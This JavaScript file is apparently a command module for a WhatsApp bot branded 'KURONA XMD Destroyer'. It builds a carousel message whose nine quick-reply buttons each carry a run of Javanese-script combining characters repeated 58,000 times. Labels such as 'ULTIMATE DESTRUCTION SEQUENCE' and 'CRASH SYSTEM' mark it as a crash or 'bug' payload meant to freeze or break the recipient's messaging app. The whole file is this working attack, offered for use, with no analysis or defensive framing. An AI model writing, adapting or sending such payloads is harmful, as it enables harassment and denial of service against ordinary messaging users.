async function test(message, sock) {
  const jid = message.key.remoteJid;

  await sock.sendMessage(
    jid,
    {
        text: "╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╮\n│ 🎴 ☠𝛫𝑈𝑅𝛩𝛮𝛥 — 𝑿𝛭𝑫 𝛥𝑅𝛭𝛥𝛤𝛯𝑫𝑫𝛩𝛮 𝛭𝛩𝑫𝛯☠ 🎴\n╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯",
        footer: "╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╮\n│ ⚡ ULTIMATE DESTRUCTION SEQUENCE ACTIVATED ⚡\n╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯",
        cards: [
           {
              image: { url: './assets/images/kurona_logo.png' },
              title: '╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╮\n│ 🎴 𝛫𝑈𝑅𝛩𝛮𝛥 — 𝑿𝛭𝑫 𝑫𝛯𝑆𝛵𝑅𝛩𝑌𝛯𝑅 🎴\n╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯',
              caption: '╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╮\n│ THE ULTIMATE ANNIHILATION SYSTEM\n╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯',
              footer: "╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╮\n│  BY 🎴 𝑫𝛯𝑽 ᬁ 𝛫𝑈𝑅𝛩𝛮𝛥 🎴 - 𝛫𝑈𝑅𝛩𝛮𝛥 - 𝑫𝛯𝑆𝛵𝑅𝛩𝑌𝛯𝑅 𝛭𝛩𝑫𝛯 \n╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯",
              buttons: [
                  {
                      name: "quick_reply",
                      buttonParamsJson: JSON.stringify({
                         display_text: `╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╮\n│ ☠️ ${"ꦾꦿꦽꦻꦷꦹꦵꦁꦂ꦳ꦘ".repeat(58000)} 💀\n╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯`,
                         id: "KURONA_ANNIHILATE"
                      })
                  },
                  {
                      name: "quick_reply",
                      buttonParamsJson: JSON.stringify({
                         display_text: `╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╮\n│ ⚡ ${"ꦾꦿꦽꦻꦷꦹꦵꦁꦂ꦳ꦘ".repeat(58000)} 🔥\n╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯`,
                         id: "KURONA_DESTROY"
                      })
                  },
                  {
                      name: "quick_reply",
                      buttonParamsJson: JSON.stringify({
                         display_text: `╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╮\n│ 💣 ${"ꦾꦿꦽꦻꦷꦹꦵꦁꦂ꦳ꦘ".repeat(58000)} ☢️\n╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯`,
                         id: "KURONA_ERADICATE"
                      })
                  },
              ]
           },
           {
              image: { url: './assets/images/kurona_logo.png' },
              title: '╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╮\n│ 🎴 𝛫𝑈𝑅𝛩𝛮𝛥 — 𝑿𝛭𝑫 𝑫𝛯𝑆𝛵𝑅𝛩𝑌𝛯𝑅 🎴\n╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯',
              caption: '╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╮\n│ MAXIMUM OVERDRIVE CRASH SYSTEM\n╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯',
              footer: "╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╮\n│ 🔥 ULTIMATE DESTRUCTION PROTOCOL 🔥\n╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯",
              buttons: [
                  {
                      name: "quick_reply",
                      buttonParamsJson: JSON.stringify({
                         display_text: `╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╮\n│ 🌋 ${"ꦾꦿꦽꦻꦷꦹꦵꦁꦂ꦳ꦘ".repeat(58000)} ⚡\n╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯`,
                         id: "KURONA_OVERLOAD"
                      })
                  },
                  {
                      name: "quick_reply",
                      buttonParamsJson: JSON.stringify({
                         display_text: `╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╮\n│ 🔴 ${"ꦾꦿꦽꦻꦷꦹꦵꦁꦂ꦳ꦘ".repeat(58000)} ☠️\n╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯`,
                         id: "KURONA_TERMINATE"
                      })
                  },
                  {
                      name: "quick_reply",
                      buttonParamsJson: JSON.stringify({
                         display_text: `╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╮\n│ ⚠️ ${"ꦾꦿꦽꦻꦷꦹꦵꦁꦂ꦳ꦘ".repeat(58000)} 💥\n╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯`,
                         id: "KURONA_DETONATE"
                      })
                  },
              ]
           },
           {
              image: { url: './assets/images/kurona_logo.png' },
              title: '╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╮\n│ 🎴 𝛫𝑈𝑅𝛩𝛮𝛥 — 𝑿𝛭𝑫 𝑫𝛯𝑆𝛵𝑅𝛩𝑌𝛯𝑅 🎴\n╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯',
              caption: '╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╮\n│ FINAL ANNIHILATION SEQUENCE\n╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯',
              footer: "╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╮\n│ ☢️ RADIATION LEVEL: CRITICAL ☢️\n╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯",
              buttons: [
                  {
                      name: "quick_reply",
                      buttonParamsJson: JSON.stringify({
                         display_text: `╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╮\n│ ☢️ ${"ꦾꦿꦽꦻꦷꦹꦵꦁꦂ꦳ꦘ".repeat(58000)} 🔥\n╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯`,
                         id: "KURONA_MELTDOWN"
                      })
                  },
                  {
                      name: "quick_reply",
                      buttonParamsJson: JSON.stringify({
                         display_text: `╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╮\n│ 💀 ${"ꦾꦿꦽꦻꦷꦹꦵꦁꦂ꦳ꦘ".repeat(58000)} ⚡\n╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯`,
                         id: "KURONA_APOCALYPSE"
                      })
                  },
                  {
                      name: "quick_reply",
                      buttonParamsJson: JSON.stringify({
                         display_text: `╭┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╮\n│ ⚡ ${"ꦾꦿꦽꦻꦷꦹꦵꦁꦂ꦳ꦘ".repeat(58000)} ☠️\n╰┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅┅╯`,
                         id: "KURONA_ARMAGEDDON"
                      })
                  },
              ]
           }

        ]
    },
    { quoted : message }
  );
}

export default test;